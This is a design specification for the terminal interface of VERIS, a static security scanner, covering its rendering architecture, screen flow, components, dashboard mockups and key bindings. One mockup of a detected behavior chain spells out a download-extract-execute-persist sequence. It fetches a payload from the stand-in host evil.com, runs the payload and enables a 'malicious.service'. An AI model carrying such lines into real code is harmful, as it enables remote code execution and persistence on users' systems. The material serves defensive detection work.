# VERIS Terminal UX, Interactive UI, Report System & Rendering Architecture — SPEC-006

**Status:** Frozen  
**Version:** 1.0  
**Applies to:** Terminal UI, interaction model, component library, report system, renderers, AI context export, diagnostics UI, theming.  
**Scope:** V1 through V4 without architectural redesign.

---

## Table of Contents

1. [Design Philosophy](#1-design-philosophy)
2. [Rendering Architecture](#2-rendering-architecture)
3. [User Journey & Screen Map](#3-user-journey--screen-map)
4. [Component Library](#4-component-library)
5. [Layout System](#5-layout-system)
6. [Live Scan Experience](#6-live-scan-experience)
7. [Interactive Dashboard](#7-interactive-dashboard)
8. [Investigation Workspace](#8-investigation-workspace)
9. [Keyboard Navigation](#9-keyboard-navigation)
10. [Command Palette](#10-command-palette)
11. [Theme System](#11-theme-system)
12. [Report System](#12-report-system)
13. [Exporters](#13-exporters)
14. [AI Context Export](#14-ai-context-export)
15. [Diagnostics UI](#15-diagnostics-ui)
16. [Performance Budget](#16-performance-budget)
17. [Terminal Compatibility](#17-terminal-compatibility)
18. [Accessibility](#18-accessibility)
19. [Future Compatibility](#19-future-compatibility)
20. [Engineering Tradeoffs](#20-engineering-tradeoffs)
21. [Common UX Mistakes](#21-common-ux-mistakes)
22. [Final Recommendations](#22-final-recommendations)

---

## 1. Design Philosophy

### 1.1 Principles

**Application, not logs.** VERIS should feel like an interactive application running in the terminal, not a script printing text. Users navigate, explore, drill down, and investigate — they don't scroll through output.

**Progressive disclosure.** Show the minimum viable information first. Reveal detail on demand. A single scan result should show a score, severity count, and top findings. The user expands to see evidence, chains, and diagnostics.

**Keyboard-first.** Every interaction is reachable via keyboard. Mouse is a convenience, not a requirement. Common actions take one keystroke. Everything else is reachable via command palette.

**Investigation, not reporting.** The primary experience is interactive investigation. Report generation is a secondary action. Users explore findings interactively before exporting.

**Beautiful but professional.** Animations are subtle and purposeful — never decorative. Color is semantic, never arbitrary. Layout is consistent, never surprising. The UI feels premium without feeling playful.

**Offline-first.** The entire TUI works without network. Every screen, every interaction, every export — all available offline.

### 1.2 Rendering Stack

```
┌──────────────────────────────────────┐
│  Terminal (xterm-256color, kitty,    │
│  wezterm, Windows Terminal, etc.)    │
└────────────────┬─────────────────────┘
                 │
┌────────────────▼─────────────────────┐
│  React Ink (rendering framework)      │
│  • Virtual DOM → string diffing      │
│  • Hooks for state management        │
│  • Component composition             │
└────────────────┬─────────────────────┘
                 │
┌────────────────▼─────────────────────┐
│  @veris/renderers (renderer contracts)│
│  • tui-renderer (Ink-based)          │
│  • html-renderer (static HTML)       │
│  • markdown-renderer (static MD)     │
│  • context-exporter (AI-ready JSON)  │
└────────────────┬─────────────────────┘
                 │
┌────────────────▼─────────────────────┐
│  @veris/cli (application layer)       │
│  • Commands (scan, report, init...)  │
│  • TUI components and screens        │
│  • State machine for user flow       │
└──────────────────────────────────────┘
```

### 1.3 Data Flow

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────┐
│  Analysis     │────▶│  Canonical      │────▶│  Renderers   │
│  Pipeline     │     │  Report         │     │              │
│               │     │  (SPEC-002)     │     │  • TUI       │
│               │     │                │     │  • HTML      │
│               │     │                │     │  • Markdown  │
│               │     │                │     │  • SARIF     │
│               │     │                │     │  • AI JSON   │
└──────────────┘     └─────────────────┘     └──────────────┘
```

**Invariant:** Renderers consume the Canonical Report only. No renderer performs analysis. No renderer modifies the report.

---

## 2. Rendering Architecture

### 2.1 Package Structure

```
packages/renderers/
├── src/
│   ├── interfaces/                 # Renderer contracts
│   │   ├── renderer.ts            # IRenderer — base contract
│   │   ├── tui-renderer.ts       # TUI-specific contract
│   │   └── static-renderer.ts    # File-based export contract
│   │
│   ├── tui/                       # Interactive terminal renderer
│   │   ├── components/            # Reusable UI components
│   │   │   ├── layout/
│   │   │   ├── navigation/
│   │   │   ├── data-display/
│   │   │   ├── feedback/
│   │   │   └── inputs/
│   │   ├── screens/               # Full-screen views
│   │   │   ├── splash/
│   │   │   ├── scan-live/
│   │   │   ├── dashboard/
│   │   │   ├── investigation/
│   │   │   ├── diagnostics/
│   │   │   └── export/
│   │   ├── hooks/                 # State management hooks
│   │   ├── state/                 # UI state machine
│   │   ├── theme/                 # Theme tokens
│   │   ├── keyboard/             # Key binding system
│   │   └── index.ts
│   │
│   ├── static/                    # Non-interactive renderers
│   │   ├── json/
│   │   ├── markdown/
│   │   ├── html/
│   │   ├── sarif/
│   │   └── ai-context/
│   │
│   └── index.ts
│
├── __tests__/
├── benchmark/
└── package.json
```

### 2.2 Renderer Contract

```typescript
interface Renderer {
  readonly id: string;
  readonly name: string;
  readonly type: 'interactive' | 'static';
  readonly supportedFormats: string[];

  render(report: CanonicalReport, options: RenderOptions): Promise<RenderOutput>;
}

interface TuiRenderer extends Renderer {
  type: 'interactive';
  start(): Promise<void>; // Enter interactive mode
  navigate(screen: ScreenName): void; // Navigate to screen
  emit(event: UIEvent): void; // Emit user interaction event
}

interface StaticRenderer extends Renderer {
  type: 'static';
  renderToFile(report: CanonicalReport, outputPath: string): Promise<void>;
  renderToString(report: CanonicalReport): Promise<string>;
}

interface RenderOptions {
  format: string;
  theme?: ThemeConfig;
  filter?: RenderFilter; // Filter what to include
  verbosity?: 'minimal' | 'normal' | 'detailed' | 'diagnostic';
}
```

---

## 3. User Journey & Screen Map

### 3.1 Complete User Journey

```
  ┌──────────────────────────────────────────────────────────┐
  │  veris scan .                                            │
  │                                                          │
  │  ┌──────────────────────┐                                │
  │  │   ANIMATED SPLASH    │  ~2s branded animation         │
  │  │   • Veris wordmark    │                                │
  │  │   • Version + engine  │                                │
  │  │   • "Initializing..." │                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   ENVIRONMENT CHECKS  │  ~500ms                        │
  │  │   ✓ Terminal compat   │                                │
  │  │   ✓ Git available     │                                │
  │  │   ✓ Disk space        │                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   TARGET SELECTION    │  Interactive picker            │
  │  │   • Current directory │                                │
  │  │   • Custom path       │                                │
  │  │   • Recent targets    │                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   PROFILE SELECTION   │  Rule pack configuration       │
  │  │   • Full scan         │                                │
  │  │   • Quick scan        │                                │
  │  │   • Secrets only      │                                │
  │  │   • Custom profile    │                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   SCAN INIT           │  Configuration summary         │
  │  │   Press Enter to start│                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   LIVE SCAN DASHBOARD │  Real-time progress            │
  │  │   • Animated progress │                                │
  │  │   • Live counters     │                                │
  │  │   • Stage indicator   │                                │
  │  │   • Throughput graph  │                                │
  │  └──────────┬───────────┘                                │
  │             │ (scan complete)                             │
  │  ┌──────────▼───────────┐                                │
  │  │   RESULTS DASHBOARD   │  Default landing view          │
  │  │   • Score overview    │                                │
  │  │   • Summary cards     │                                │
  │  │   • Top findings      │                                │
  │  └──────────┬───────────┘                                │
  │             │ (user explores)                             │
  │  ┌──────────▼───────────┐                                │
  │  │ INVESTIGATION VIEWS  │  Interactive exploration        │
  │  │ • Findings list       │                                │
  │  │ • Finding detail      │  (expand)                      │
  │  │ • Evidence viewer     │     │                          │
  │  │ • Behavior chains     │     │                          │
  │  │ • Risk dimensions     │     │                          │
  │  │ • Artifact tree       │     │                          │
  │  │ • Timeline            │     │                          │
  │  └──────────┬───────────┘     │                          │
  │             │                 │                          │
  │  ┌──────────▼───────────┐     │                          │
  │  │   EXPORT / SHARE      │◄────┘                          │
  │  │   • JSON              │                                │
  │  │   • HTML report       │                                │
  │  │   • Markdown          │                                │
  │  │   • SARIF             │                                │
  │  │   • AI Context        │                                │
  │  └──────────┬───────────┘                                │
  │             │                                            │
  │  ┌──────────▼───────────┐                                │
  │  │   EXIT                │  "Scan complete. Goodbye."     │
  │  └──────────────────────┘                                │
  └──────────────────────────────────────────────────────────┘
```

### 3.2 Screen Registry

```typescript
type ScreenName =
  | 'splash'
  | 'env-checks'
  | 'target-select'
  | 'profile-select'
  | 'scan-init'
  | 'scan-live'
  | 'dashboard'
  | 'findings'
  | 'finding-detail'
  | 'evidence'
  | 'behavior-chains'
  | 'risk-dimensions'
  | 'artifacts'
  | 'timeline'
  | 'diagnostics'
  | 'export'
  | 'help'
  | 'command-palette';
```

### 3.3 Navigation Model

- Screens are organized as a **tree**, not a flat list.
- Users can always navigate to the **parent** screen (via `Escape`).
- Users can always jump to any screen via **command palette** (`Ctrl+P`).
- The **breadcrumb** at the top shows the current path: `Dashboard > Findings > Finding Detail`
- **Persistent footer** shows available actions for the current screen.

---

## 4. Component Library

### 4.1 Component Catalog

| Component          | Purpose                 | States                               | Keyboard             |
| ------------------ | ----------------------- | ------------------------------------ | -------------------- |
| **Box**            | Bordered container      | normal, focused, error               | Tab to focus         |
| **Panel**          | Collapsible section     | collapsed, expanded, focused         | Space to toggle      |
| **Card**           | Information card        | normal, hovered, selected            | Tab, Enter           |
| **Table**          | Data grid               | normal, sorted, filtered, selected   | j/k, arrows, /search |
| **Tree**           | Hierarchical data       | collapsed, expanded, selected        | j/k, h/l, z-enter    |
| **Badge**          | Status label            | severity variants, count variants    | —                    |
| **StatusBar**      | Bottom status line      | information, warning, error          | —                    |
| **ProgressBar**    | Progress indicator      | determinate, indeterminate, complete | —                    |
| **Spinner**        | Activity indicator      | spin states (frame animation)        | —                    |
| **Toast**          | Temporary notification  | info, success, warning, error        | —                    |
| **Tabs**           | Tab navigation          | active, inactive, focused            | Tab/arrows           |
| **CommandPalette** | Fuzzy command search    | open, closed, filtered               | Ctrl+P               |
| **Breadcrumb**     | Navigation path         | segments, current, clickable         | —                    |
| **Dialog**         | Modal confirmation      | open, closed, submitting             | Enter/Escape         |
| **SplitView**      | Resizable panes         | vertical, horizontal, balanced       | Ctrl+W               |
| **Inspector**      | Detail inspection panel | open, closed, pinned                 | Tab navigation       |
| **DiffView**       | Side-by-side diff       | additions, deletions, unchanged      | j/k scroll           |
| **Timeline**       | Event timeline          | events, grouped, expanded            | j/k, Enter           |

### 4.2 Component Specifications

**Box:**

```typescript
interface BoxProps {
  borderStyle: 'single' | 'double' | 'round' | 'hidden';
  borderColor: ColorToken;
  padding: Spacing;
  title?: string; // Title in top border
  subtitle?: string; // Subtitle below title
  focused?: boolean; // Focus highlight
  height?: number | 'auto';
  width?: number | '100%';
  children: ReactNode;
}
```

**Panel:**

```typescript
interface PanelProps {
  title: string;
  subtitle?: string;
  defaultCollapsed?: boolean;
  collapsed?: boolean;
  onToggle?: () => void;
  badge?: BadgeProps; // Count badge in header
  headerActions?: Action[]; // Action buttons in header
  children: ReactNode;
}
```

**Table:**

```typescript
interface TableProps {
  columns: Column[];
  data: Row[];
  sortColumn?: string;
  sortDirection?: 'asc' | 'desc';
  selectedRow?: number;
  onSelect?: (row: Row) => void;
  onSort?: (column: string) => void;
  filter?: string;
  pageSize?: number;
  virtualized?: boolean; // Virtual scroll for large datasets
}
```

**Badge (severity variants):**

```typescript
type BadgeVariant =
  | 'critical' // Red background
  | 'high' // Orange background
  | 'medium' // Yellow background
  | 'low' // Blue background
  | 'info' // Gray background
  | 'success' // Green background
  | 'warning' // Yellow background
  | 'count'; // Neutral count badge

interface BadgeProps {
  variant: BadgeVariant;
  label: string;
  icon?: string; // Unicode icon
  pulse?: boolean; // Animated pulse (for live status)
}
```

### 4.3 Component Design Principles

- **Maximum width:** Components should not exceed 120 characters unless displaying code.
- **Minimum width:** Components should not be narrower than 40 characters.
- **Padding:** 1 character internal padding, 1 character margin between components.
- **Focus indication:** Focused component gets a highlighted border or background.
- **Empty states:** Every component must handle empty data with a clear message ("No findings", "No behaviors detected").
- **Loading states:** Every component must show a loading indicator while data is being computed.

---

## 5. Layout System

### 5.1 Screen Layout Model

Every screen follows a **header → content → footer** model:

```
┌──────────────────────────────────────────────────────┐
│  Breadcrumb                    Status: Scanning       │  ← Header (2 lines)
├──────────────────────────────────────────────────────┤
│                                                      │
│              Main Content Area                       │  ← Content (variable)
│              (scrollable)                            │
│                                                      │
│                                                      │
├──────────────────────────────────────────────────────┤
│  ? Help  /  Search  /  ^P Command Palette            │  ← Footer (1 line)
│  ↑↓ Navigate  Enter Select  Esc Back  q Quit        │
└──────────────────────────────────────────────────────┘
```

### 5.2 Split Layouts

```
Single pane (default):
┌──────────────────────────────────────────────────────┐
│                    Content                            │
└──────────────────────────────────────────────────────┘

Vertical split (findings + detail):
┌─────────────────────────┬────────────────────────────┐
│  Findings List          │  Detail Panel              │
│                         │                            │
│  [selected finding]     │  Evidence, code context,   │
│  finding 2              │  recommendation            │
│  finding 3              │                            │
└─────────────────────────┴────────────────────────────┘

Horizontal split (timeline + detail):
┌──────────────────────────────────────────────────────┐
│  Timeline / Behavior Chain                           │
├──────────────────────────────────────────────────────┤
│  Detail / Evidence Viewer                            │
└──────────────────────────────────────────────────────┘

Three-pane (artifact tree + findings + detail):
┌──────────┬─────────────────────────┬─────────────────┐
│ Artifact │  Findings               │  Detail         │
│ Tree     │                         │                 │
│          │  finding 1 ◄            │  evidence       │
│ src/     │  finding 2              │  code context   │
│  main.py │  finding 3              │  recommend      │
│  utils/  │                         │                 │
└──────────┴─────────────────────────┴─────────────────┘
```

### 5.3 Responsive Behavior

- On narrow terminals (< 80 cols): single pane, detail replaces list.
- On medium terminals (80–120 cols): two-pane vertical split.
- On wide terminals (> 120 cols): three-pane layout.
- On very narrow terminals (< 50 cols): minimal mode, text-only fallback.

---

## 6. Live Scan Experience

### 6.1 Animated Splash

```
┌──────────────────────────────────────────────────────┐
│                                                      │
│                    ╔══════════════╗                   │
│                    ║   V E R I S  ║                   │
│                    ╚══════════════╝                   │
│                                                      │
│         Static Security Analysis Platform             │
│                                                      │
│         Engine v0.1.0  •  24 rule packs              │
│         12 extractors  •  4 renderers                │
│                                                      │
│         ─── Initializing ───                         │
│         ████████░░░░░░░░░░  48%                      │
│                                                      │
│         "Deterministic analysis.                     │
│          Explainable results."                       │
│                                                      │
└──────────────────────────────────────────────────────┘
```

**Animation:** The wordmark fades in over 500ms. The progress bar animates from 0% to 100% over the actual initialization time (target: < 2s). The tagline types in character by character.

### 6.2 Live Scan Dashboard

```
┌──────────────────────────────────────────────────────┐
│  Scan: /home/user/project                   00:02:34  │
├──────────────────────────────────────────────────────┤
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐           │
│  │ Files    │  │ Findings │  │ Risk     │           │
│  │ 1,234    │  │ 12       │  │ Medium   │           │
│  │ ▲ 45/s   │  │ ▲ 3 crit │  │ 4.7/10   │           │
│  └──────────┘  └──────────┘  └──────────┘           │
│                                                      │
│  Stage: [████████████████░░░░] 85%  Rule Matching    │
│         ├──────────┬──────────┬──────────┬──────────┤
│         Extraction│Classify  │Behaviors │Rules     │
│         ✓ 100%    │✓ 100%    │✓ 100%    │█▒ 70%    │
│                                                      │
│  Current artifact: src/utils/network.py              │
│  Throughput: 45 files/sec  •  Memory: 128 MB         │
│  ETA: 12 seconds remaining                           │
│                                                      │
│  Recent findings:                                    │
│  ● CRIT  Hardcoded API key    src/config.py:42      │
│  ● HIGH  Eval usage            src/main.py:156       │
│  ● MED   Insecure HTTP        src/utils/http.py:23  │
│                                                      │
├──────────────────────────────────────────────────────┤
│  ^C Cancel  •  ? Help                                │
└──────────────────────────────────────────────────────┘
```

**Live counters update every 200ms.** Progress bar uses smooth easing. Recent findings scroll as new ones appear. ETA updates based on current throughput. The stage indicator shows each pipeline stage with completion percentage.

### 6.3 Animation Guidelines

- **Frame rate:** Target 30fps for live scan, 15fps for static screens.
- **Animation types:** Fade (opacity), slide (position), progress (width), pulse (background).
- **Performance:** Animations use requestAnimationFrame equivalent. No layout recalculations during animation frames.
- **Low-power mode:** Reduce to 10fps if system battery is low.
- **No animation mode:** `--no-animation` flag disables all animations.

### 6.4 Scan Completion

```
┌──────────────────────────────────────────────────────┐
│                                                      │
│   ╔═══════════════════════════════════════════════╗  │
│   ║           Scan Complete                       ║  │
│   ║                                               ║  │
│   ║   12 findings in 1,234 files                  ║  │
│   ║   3 critical • 4 high • 3 medium • 2 low     ║  │
│   ║                                               ║  │
│   ║   Risk: 4.7/10 (Medium)                      ║  │
│   ║   Trust: 0.85/1.0 (Trusted)                  ║  │
│   ║   Duration: 34.2 seconds                      ║  │
│   ╚═══════════════════════════════════════════════╝  │
│                                                      │
│   Press Enter to explore results                     │
│                                                      │
└──────────────────────────────────────────────────────┘
```

Animates in: score number counts up from 0, checkmark appears with a pulse, then the prompt appears.

---

## 7. Interactive Dashboard

### 7.1 Default Landing View

```
┌──────────────────────────────────────────────────────┐
│  Dashboard  ─  /home/user/project             00:02:34│
├──────────────────────────────────────────────────────┤
│                                                      │
│  ╔══════════════════════════════════════════════════╗ │
│  ║  Risk: 4.7 / 10  (Medium)        Trust: 0.85    ║ │
│  ║  ██████████░░░░░░░░░░░░░░░░░░    ████████████░   ║ │
│  ║  Confidence: 0.92                               ║ │
│  ╚══════════════════════════════════════════════════╝ │
│                                                      │
│  ┌─────────────────────┐  ┌──────────────────────┐  │
│  │ Findings by Severity │  │ Risk by Dimension    │  │
│  │                     │  │                      │  │
│  │ ■ Critical  3      │  │ Execution    6.2 ███ │  │
│  │ ■ High      4      │  │ Secrets      5.8 ███ │  │
│  │ ■ Medium    3      │  │ Network      3.1 ██  │  │
│  │ ■ Low       2      │  │ Config       1.0 ░   │  │
│  └─────────────────────┘  └──────────────────────┘  │
│                                                      │
│  ╔══════════════════════════════════════════════════╗ │
│  ║ Top Findings                         (3 critical)║ │
│  ║                                                ║ │
│  ║ ● CRIT Hardcoded AWS Key   [0.95] src/config.. ║ │
│  ║ ● CRIT Exposed Private Key [0.92] src/.env     ║ │
│  ║ ● CRIT Weak Crypto (MD5)  [0.88] src/auth.ts  ║ │
│  ║ ● HIGH Eval Usage          [0.85] src/cli.ts  ║ │
│  ║ ● HIGH Command Injection   [0.82] src/exec.ts ║ │
│  ║   ... and 7 more findings                      ║ │
│  ╚══════════════════════════════════════════════════╝ │
│                                                      │
│  Behavior Chains detected: 2                         │
│  ► Download → Extract → Execute (3 behaviors)       │
│  ► Credential Access → Exfiltration (2 behaviors)   │
│                                                      │
├──────────────────────────────────────────────────────┤
│  ↑↓ Navigate  Enter Detail  / Search  ^P Commands   │
│  F Findings  C Chains  D Dimensions  R Risk Detail  │
└──────────────────────────────────────────────────────┘
```

### 7.2 Dashboard Sections

| Section            | Priority             | Shows                                               |
| ------------------ | -------------------- | --------------------------------------------------- |
| Score card         | Always               | Risk, Trust, Confidence scores with visual bars     |
| Severity breakdown | Always               | Count of findings by severity                       |
| Risk dimensions    | Always               | Top 5 riskiest dimensions with visual bars          |
| Top findings       | Always               | Top 10 findings with severity, confidence, location |
| Behavior chains    | If present           | Detected behavioral sequences                       |
| Scan statistics    | Collapsed by default | Files, features, behaviors, duration                |
| Recommendations    | Collapsed by default | Ordered remediation guidance                        |

---

## 8. Investigation Workspace

### 8.1 Findings View

```
┌──────────────────────────────────────────────────────┐
│  Findings (12)              Filter: All │ Sort: Risk │
├──────────────────────────────────────────────────────┤
│                                                      │
│  ┌─────┬────────┬──────────┬───────────┬───────────┐ │
│  │  #  │ Rule   │ Severity │ Confidence│ Location  │ │
│  ├─────┼────────┼──────────┼───────────┼───────────┤ │
│  │  1  │ aws-   │ CRIT     │ 0.95      │ src/      │ │
│  │     │ key    │          │           │ config.ts │ │
│  │     │        │          │           │ :42       │ │
│  │  2  │ pvt-   │ CRIT     │ 0.92      │ src/.env  │ │
│  │     │ key    │          │           │ :15       │ │
│  │  3  │ weak-  │ CRIT     │ 0.88      │ src/      │ │
│  │     │ md5    │          │           │ auth.ts   │ │
│  │  4  │ eval-  │ HIGH     │ 0.85      │ src/      │ │
│  │     │ usage  │          │           │ cli.ts    │ │
│  │  5  │ cmd-   │ HIGH     │ 0.82      │ src/      │ │
│  │     │ inj    │          │           │ exec.ts   │ │
│  └─────┴────────┴──────────┴───────────┴───────────┘ │
│                                                      │
│  Page 1 of 3   •  Showing 5 of 12 findings           │
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Navigate  Enter Detail  / Filter  g Top  G End  │
│  s Sort  r Reverse  t Table/Card toggle              │
└──────────────────────────────────────────────────────┘
```

### 8.2 Finding Detail View

```
┌──────────────────────────────────────────────────────┐
│  Finding Detail          ◄ Back to Findings List     │
├──────────────────────────────────────────────────────┤
│                                                      │
│  ╔══════════════════════════════════════════════════╗ │
│  ║  CRITICAL  Hardcoded AWS Access Key              ║ │
│  ║  Confidence: 0.95  │  Risk: 6.3  │  Secrets Dim ║ │
│  ╚══════════════════════════════════════════════════╝ │
│                                                      │
│  Description:                                        │
│  Detected hardcoded AWS access key ID matching       │
│  the pattern AKIA[0-9A-Z]{16} in source code.       │
│                                                      │
│  Evidence (3 matches):                               │
│  ┌──────────────────────────────────────────────────┐│
│  │ 1. src/config.ts:42                              ││
│  │    AWSAccessKeyId = "AKIAIOSFODNN7EXAMPLE"       ││
│  │    ↑─────────────────────── matched ───────────↑ ││
│  │    Confidence: 0.98  •  Match: exact regex      ││
│  │                                                 ││
│  │ 2. src/.env.prod:15                             ││
│  │    AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE           ││
│  │    ↑─────────────────────── matched ───────────↑ ││
│  │    Confidence: 0.95  •  Match: exact regex      ││
│  └──────────────────────────────────────────────────┘│
│                                                      │
│  Recommendation:                                     │
│  1. Rotate the exposed access key                    │
│  2. Remove hardcoded keys from source code           │
│  3. Use AWS Secrets Manager or environment vars      │
│                                                      │
│  Traceability:                                       │
│  Rule: secrets/aws-key v1.2.0  →  Behavior: T5100   │
│  →  Feature: string-literal  →  Artifact: config.ts │
│                                                      │
├──────────────────────────────────────────────────────┤
│  Tab: Evidence/Rec/Trace  j/k Scroll  e Export      │
└──────────────────────────────────────────────────────┘
```

### 8.3 Behavior Chain View

```
┌──────────────────────────────────────────────────────┐
│  Behavior Chain                         1 of 2 chains│
├──────────────────────────────────────────────────────┤
│                                                      │
│  Download → Extract → Execute → Persist → Cleanup   │
│  ────────────────────────────────────────────────    │
│  Chain confidence: 0.82  •  Length: 5  •  Sequential │
│                                                      │
│  ┌──────────────────────────────────────────────────┐│
│  │  Step 1: HTTP Download               T3100      ││
│  │  src/downloader.py:23                            ││
│  │  requests.get("http://evil.com/payload.zip")     ││
│  │                                                  ││
│  │  Step 2: Archive Extraction         T9100       ││
│  │  src/extract.py:45                               ││
│  │  zipfile.extractall("/tmp/payload")              ││
│  │                                                  ││
│  │  Step 3: Process Creation          T8100        ││
│  │  src/runner.py:12                                ││
│  │  subprocess.run("/tmp/payload/run.sh")           ││
│  │                                                  ││
│  │  Step 4: Service Installation      T2300        ││
│  │  src/persist.py:8                                ││
│  │  os.system("systemctl enable malicious.service") ││
│  │                                                  ││
│  │  Step 5: File Cleanup              T6120        ││
│  │  src/cleanup.py:33                               ││
│  │  shutil.rmtree("/tmp/payload")                   ││
│  └──────────────────────────────────────────────────┘│
│                                                      │
│  Chain risk multiplier: 1.20 (amplified 20%)         │
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Scroll  v View Chain Findings  e Export        │
└──────────────────────────────────────────────────────┘
```

### 8.4 Artifact Tree View

```
┌──────────┬───────────────────────────────────────────┐
│ Artifacts │  Findings for src/main.py                 │
├──────────┼───────────────────────────────────────────┤
│          │                                           │
│  src/    │  3 findings in this file:                 │
│  ├── cli │                                           │
│  ├── main│  ● CRIT Hardcoded API Key                 │
│  │   .py │     src/main.py:42                        │
│  ├── uti │     ↓ Evidence:                           │
│  │   ls/ │     api_key = "sk-..." at line 42        │
│  │   ├── │                                           │
│  │   │ h │  ● HIGH Unsafe File Write                 │
│  │   │ tt│     src/main.py:156                       │
│  │   │ p.│     ↓ Evidence:                           │
│  │   │ py│     open(path, "w") at line 156          │
│  │   │   │                                           │
│  │   │ n │  ● MED Insecure HTTP                      │
│  │   │ et│     src/main.py:23                        │
│  │   │ wo│     ↓ Evidence:                           │
│  │   │ rk│     http:// (not https) at line 23       │
│  │   │ .p│                                           │
│  │   │ y │                                           │
│  │   └── │                                           │
│  ├── .en│                                           │
│  │   v  │                                           │
│  │   .pr│                                           │
│  │   od │                                           │
│  └──────┘                                           │
└──────────┴───────────────────────────────────────────┘
```

### 8.5 Risk Dimensions View

```
┌──────────────────────────────────────────────────────┐
│  Risk Dimensions                                      │
├──────────────────────────────────────────────────────┤
│                                                      │
│  Dimension                  Risk     Evidence  Weight│
│  ───────────────────────────────────────────────────│
│  Execution                  ████████░  12      35%  │
│  Secrets                    ██████░░░  8       25%  │
│  Network                    ████░░░░░  5       18%  │
│  File System                ███░░░░░░  4       12%  │
│  Configuration              █░░░░░░░░  2       10%  │
│                                                      │
│  Most impactful: Execution                           │
│  • 12 evidence items across 5 behaviors              │
│  • Mean severity: 6.8                                │
│  • Severity multiplier: 1.68                         │
│  • Effective weight: 0.35 × 1.68 = 0.59             │
│                                                      │
│  Expand for per-finding breakdown                    │
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Navigate  Enter Expand  Tab Switch View        │
└──────────────────────────────────────────────────────┘
```

### 8.6 Timeline View

```
┌──────────────────────────────────────────────────────┐
│  Timeline (by extraction order)                      │
├──────────────────────────────────────────────────────┤
│                                                      │
│  00:00 ── Scan started                               │
│  00:01 ── Extracting files...                        │
│  00:02 ── │  src/main.py                             │
│  00:02 ── │  │  Feature: function-call "eval"       │
│  00:02 ── │  │  Feature: string-literal "..."        │
│  00:02 ── │  │  Behavior: T1120 Code Evaluation     │
│  00:02 ── │  │  Rule: eval-usage → MATCH            │
│  00:03 ── │  │  Finding: HIGH Eval Usage            │
│  00:03 ── │  src/utils/network.py                    │
│  00:03 ── │  │  Feature: url "http://evil.com"      │
│  00:03 ── │  │  Behavior: T3100 HTTP Communication  │
│  00:04 ── │  │  Rule: insecure-http → MATCH         │
│  00:04 ── │  │  Finding: MED Insecure HTTP           │
│  00:05 ── Extracting archives...                     │
│  00:06 ── Analyzing behaviors...                     │
│  00:07 ── Detected chain: Download→Extract→Execute  │
│  00:08 ── Computing risk profile...                  │
│  00:09 ── Scan complete                              │
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Scroll  Enter Expand Event  / Search            │
└──────────────────────────────────────────────────────┘
```

---

## 9. Keyboard Navigation

### 9.1 Global Shortcuts

| Key                 | Action                          | Context |
| ------------------- | ------------------------------- | ------- |
| `q`                 | Quit / Go back                  | Global  |
| `?`                 | Show help overlay               | Global  |
| `Ctrl+P`            | Open command palette            | Global  |
| `Ctrl+C`            | Cancel scan / interrupt         | Global  |
| `Escape`            | Back to parent screen           | Global  |
| `Tab` / `Shift+Tab` | Next/previous focusable element | Global  |
| `Ctrl+R`            | Refresh current view            | Global  |
| `Ctrl+S`            | Export current view             | Global  |

### 9.2 Navigation Shortcuts

| Key | Action           |
| --- | ---------------- |
| `f` | Findings list    |
| `c` | Behavior chains  |
| `d` | Risk dimensions  |
| `a` | Artifacts        |
| `t` | Timeline         |
| `x` | Diagnostics      |
| `h` | Dashboard (home) |
| `g` | Go to top        |
| `G` | Go to bottom     |

### 9.3 List Navigation

| Key          | Action                           |
| ------------ | -------------------------------- |
| `j` / `Down` | Move down                        |
| `k` / `Up`   | Move up                          |
| `Enter`      | Select / open detail             |
| `/`          | Filter list (opens filter input) |
| `n`          | Next match (after search)        |
| `N`          | Previous match                   |
| `s`          | Sort by current column           |
| `r`          | Reverse sort direction           |
| `t`          | Toggle view mode (table/card)    |
| `Ctrl+F`     | Page down                        |
| `Ctrl+B`     | Page up                          |

### 9.4 Detail View

| Key          | Action                             |
| ------------ | ---------------------------------- |
| `Escape`     | Back to list                       |
| `Tab`        | Next tab (Evidence / Recs / Trace) |
| `Shift+Tab`  | Previous tab                       |
| `j` / `Down` | Scroll down                        |
| `k` / `Up`   | Scroll up                          |
| `e`          | Export this finding                |
| `y`          | Yank (copy) finding ID             |
| `o`          | Open in editor (if configured)     |

### 9.5 Command Palette

| Key       | Action                   |
| --------- | ------------------------ |
| `Ctrl+P`  | Open                     |
| `Type`    | Fuzzy filter commands    |
| `Enter`   | Execute selected command |
| `Escape`  | Close                    |
| `Up/Down` | Navigate results         |

### 9.6 Focus Management

- Tab order follows visual layout (left to right, top to bottom).
- Focused element has a visible border or background highlight.
- Focus is **trapped** within dialogs and modals.
- Restoring focus: when returning to a list, the previously selected item is re-focused.
- Keyboard navigation works even if mouse is used (no mode switching).

---

## 10. Command Palette

### 10.1 Design

```
┌──────────────────────────────────────────────────────┐
│  ╔══════════════════════════════════════════════════╗ │
│  ║  > Filter commands...                           ║ │
│  ╠══════════════════════════════════════════════════╣ │
│  ║  📋 Findings › Show only critical findings      ║ │
│  ║  📋 Findings › Export as JSON                    ║ │
│  ║  🔗 Chains   › Show behavior chains             ║ │
│  ║  📊 Risk     › Show risk breakdown              ║ │
│  ║  📄 Export   › Export as HTML report             ║ │
│  ║  📄 Export   › Export as AI Context              ║ │
│  ║  ⚙️ Config   › Change scan profile              ║ │
│  ║  ⚙️ Config   › Toggle dark/light theme          ║ │
│  ║  ❓ Help     › Show keyboard shortcuts           ║ │
│  ║  ❓ Help     › About Veris                       ║ │
│  ╚══════════════════════════════════════════════════╝ │
└──────────────────────────────────────────────────────┘
```

### 10.2 Command Structure

```typescript
interface Command {
  id: string; // "findings.filter-critical"
  category: string; // "Findings"
  label: string; // "Show only critical findings"
  keys: string[]; // Searchable keywords
  action: () => void; // Execute
  icon?: string; // Unicode icon
  shortcut?: string; // Keyboard shortcut (display only)
}
```

